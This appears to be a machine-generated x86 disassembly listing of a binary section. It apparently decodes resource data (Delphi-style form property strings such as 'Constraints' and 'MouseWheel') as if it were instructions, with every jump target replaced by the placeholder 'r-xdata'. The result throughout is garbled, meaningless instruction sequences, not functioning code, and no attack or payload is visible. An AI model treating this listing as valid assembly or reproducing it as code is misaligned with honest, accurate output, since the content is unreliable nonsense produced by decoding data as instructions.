add edx [ eax ]
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
in al 0xaa
add [ edi + ebx * 4 ] esp
stosb [ edi ]
add edx [ eax + r-xdata ]
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
popad
imul ebp [ esi + 0x74 ] 0xaa9fec73
hlt
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
cmpsd [ esi ] [ edi ]
add edi esp
salc
stosd [ edi ]
add esi [ eax + ebx * 8 - 0x55 ]
add edx [ eax ]
xlat
stosd [ edi ]
add esi [ eax - 0x2a ]
stosd [ edi ]
add ecx [ eax ]
push esp
dec ebp
popad
jb r-xdata
imul ebp [ esi + 0x53 ] 0x5657a69
add [ eax ] al
add [ eax ] al
add eax [ edi * 2 + 0x403a7 ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
lahf
stosb [ edi ]
lahf
stosb [ edi ]
outsd
insb
jae r-xdata
popad
js r-xdata
jb r-xdata
mov al [ 0x1003aa ]
imul ebp [ esi + 0x73 ] 0x6400408d
mov eax [ 0x80703aa ]
push esp
dec ebp
popad
jb r-xdata
add ecx [ eax ]
add [ eax ] al
push esp
in al 0xaa
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax + 0x803aa9f ] al
add eax [ ecx ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] 0x408d73
sbb [ eax + 0x100703aa ] ah
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
mov al [ 0x1403aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al [ eax ]
add eax 0x68676952
imul ebp [ esi + 0x73 ] r-xdata
add al 0x7d
cmpsd [ esi ] [ edi ]
add edx [ eax + eax ]
add bh bh
hlt
imul esp [ edi + 0x68 ] 0xaa9f8074
imul esp [ gs : edi + 0x68 ] 0xaa9f8074
add ecx [ eax + eax ]
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add al 0x4c
outsb
lea eax [ bx + si ]
jl r-xdata
outsd
insd
lea eax [ eax ]
push eax
mov [ 0x3aa ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc edx
outsd
je r-xdata
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
jge r-xdata
mov al [ 0xc03aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov [ 0x2003aa ] al
add [ eax ] al
in al dx
imul ebp [ fs : esi + 0x67 ] r-xdata
pushad
stosb [ edi ]
add eax [ edi ]
or [ eax + edx * 2 + 0x61 ] dl
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
add [ eax ] al
add [ eax ] eax
add edx [ edi + ebp * 2 + 0x70 ]
shl [ eax + 0x1003aa ] 0x1
mov al [ 0x45c803aa ]
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x294bfc59 ]
stosd [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
cmpsd [ esi ] [ edi ]
add edi esp
salc
stosd [ edi ]
add esi [ eax + ebx * 8 - 0x55 ]
add edi [ eax ]
fisubr [ ebx - 0x54298ffd ]
add ecx [ eax ]
push esp
push eax
popad
imul ebp [ fs : esi + 0x67 ] 0x7c00408d
mov [ 0x80703aa ] al
push esp
push eax
popad
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x56 ] ch
add esp [ eax ]
add [ eax ] al
add ah ch
je r-xdata
add ecx [ eax ]
add [ eax ] al
push [ eax ]
xlat
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
add al dl
mov al [ 0x803aa ]
add bh bh
xor bh dl
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x294bfc59 ]
stosd [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
add eax [ eax + eax ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
adc [ esi - 0x59efc3fd ] ah
outsd
insd
lea eax [ eax ]
and [ ebx + 0xb0803aa ] ah
push esp
dec ebp
outsd
jne r-xdata
add ecx [ eax ]
add [ eax ] al
push [ eax ]
xlat
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
add al dl
mov al [ 0x803aa ]
add bh bh
xor bh dl
pop es
or [ esi ] al
push ebx
outsb
jb r-xdata
dec ebp
outsd
jbe r-xdata
jne r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
mov eax [ 0x403aa ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
mov al [ 0xc03aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
popad
je r-xdata
inc ebp
jbe r-xdata
add ecx [ ebx - 0x555c6740 ]
add ecx [ eax ]
andps xmm1 [ ebp + 0x6f ]
cmpsb [ esi ] [ edi ]
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x4c
mov al [ 0x1003aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
je r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
je r-xdata
jb r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
add eax 0x65530608
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
inc edx
outsd
je r-xdata
mov al [ 0x1403aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
or [ esi ] cl
push esp
dec ebx
jns r-xdata
jbe r-xdata
js r-xdata
outsb
or al 0x54
dec ebp
outsd
or eax 0x73756f4d
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add [ ebx ] eax
outsb
je r-xdata
add [ edx ] al
or [ esi ] al
cmpsd [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edx eax
inc edx
popad
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx + edx ] dl
push cs
push esp
dec ebp
outsd
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
push ebx
push 0xb746669
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
adc [ esi + 0x408d03 ] ah
cmp al 0xa5
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc ebx
push 0x14007261
adc [ esi - 0x59efd7fd ] esp
add ecx [ ebp - 0x5ac3ffc0 ]
add ecx [ eax ]
push es
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
rcr [ ebp + 0x408d03aa ] 0x1
add [ esp + 0x90803aa ] dh
push esp
dec ebx
je r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ eax + 0x10 ]
add [ ecx + edx ] dl
add edx [ eax + r-xdata ]
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ ecx ] al
push esp
push ebx
dec ebp
outsd
jne r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
dec edi
jbe r-xdata
add [ ebx ] eax
dec ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add ecx [ ebp - 0x5b4bffc0 ]
adc [ esi - 0x55622ffd ] ah
outsb
add [ 0x66696853 ] al
je r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x7803aa9d ]
jne r-xdata
push 0xb746669
jb r-xdata
jne r-xdata
je r-xdata
inc edx
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
je r-xdata
inc esp
jb r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
adc al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
add [ ecx ] al
push esp
push ebx
push 0x53746669
pop eax
pop es
dec ecx
outsb
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
popfd
stosb [ edi ]
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
push 0x53746669
je r-xdata
je r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add esp [ edi + edx * 4 - 0x5993fc56 ]
stosb [ edi ]
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
inc esp
jb r-xdata
jns r-xdata
jb r-xdata
stosb [ edi ]
add ecx [ eax ]
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
mov ah 0xa4
je r-xdata
push ebx
jb r-xdata
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
je r-xdata
je r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ esi + ebx * 4 - 0x56 ]
add eax [ eax ]
adc [ esi - 0x5a3b6ffd ] ah
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x5c03ffc0 ]
stosb [ edi ]
add ecx [ eax ]
adc edx [ ebp + ecx * 2 + 0x6f ]
jne r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
push ebx
outsb
jb r-xdata
jb r-xdata
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x59dbffc0 ]
stosb [ edi ]
add ecx [ eax ]
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
adc [ esi - 0x59efc3fd ] esp
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ esi - 0x59efc3fd ] esp
add ecx [ eax ]
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x14 ] si
adc [ esi - 0x55685bfd ] esp
add ebp [ esi - 0x56 ]
push ebx
outsb
add al 0x8
push es
pop es
dec eax
imul esi [ esp + edx * 2 + 0x65 ] 0x49077473
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
adc al 0x11
cmpsb [ esi ] [ edi ]
add ecx [ eax - 0x66 ]
stosb [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x58cfffc0 ]
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx eax
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
jns r-xdata
jb r-xdata
je r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] dl
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x7803aa9d ]
jne r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
jb r-xdata
push es
push ebx
outsb
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
cmpsb [ esi ] [ edi ]
add ecx [ eax - 0x66 ]
stosb [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ esi + ebx * 4 - 0x56 ]
add eax [ eax ]
adc [ esi - 0x583f6ffd ] ah
stosb [ edi ]
add ecx [ eax ]
or al 0x54
adc al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
outsb
push edx
jae r-xdata
sub [ esi + 0x3aa ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x5556fb40 ]
add ecx [ eax ]
andps xmm0 [ ebx + 0x61 ]
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x14 ] si
adc [ esi - 0x5565b7fd ] esp
add edi [ eax - 0x58 ]
stosb [ edi ]
add ecx [ eax ]
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x55557340 ]
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
scasb [ edi ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x4c08b03 ] ah
test eax 0xf0803aa
push esp
inc ebx
popad
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
scasb [ edi ]
stosb [ edi ]
add edx esp
mov bh 0xaa
add eax [ eax ]
adc [ esi - 0x5557d3fd ] ah
add ecx [ eax ]
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add ecx [ eax ]
push ss
push esp
dec ebp
outsd
jne r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi - 0x733f74fd ] ah
stosb [ edi ]
stosb [ edi ]
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x5555fb40 ]
add ecx [ eax ]
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ esi - 0x59efc3fd ] ah
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x54 ] cl
stosb [ edi ]
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add edi [ eax + edx ]
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add esp [ edx + edx ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add [ eax ] al
sbb al 0x8b
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add esi eax
cmp eax 0x45d403a8
jo r-xdata
cmpsd [ esi ] [ edi ]
add [ ebx + ecx * 4 ] bl
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi + 0x408d03 ] ah
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
adc [ esi + 0x408d03 ] ah
je r-xdata
movsb [ edi ] [ esi ]
stosd [ edi ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 ] dh
stosb [ edi ]
add ebp [ esi + ebp * 4 ]
stosb [ edi ]
add eax [ eax ]
lea eax [ eax ]
jbe r-xdata
add ebx [ esi ]
scasb [ edi ]
stosb [ edi ]
add edx [ eax + 0x1c000001 ]
mov esp [ edi - 0x57c20ffd ]
add edx esp
inc ebp
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi - 0x5554fffd ] ah
add ecx [ eax ]
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jb r-xdata
outsb
stosb [ edi ]
add ecx [ eax ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add esp eax
0x235c03aa 0x3ab
push eax
outsd
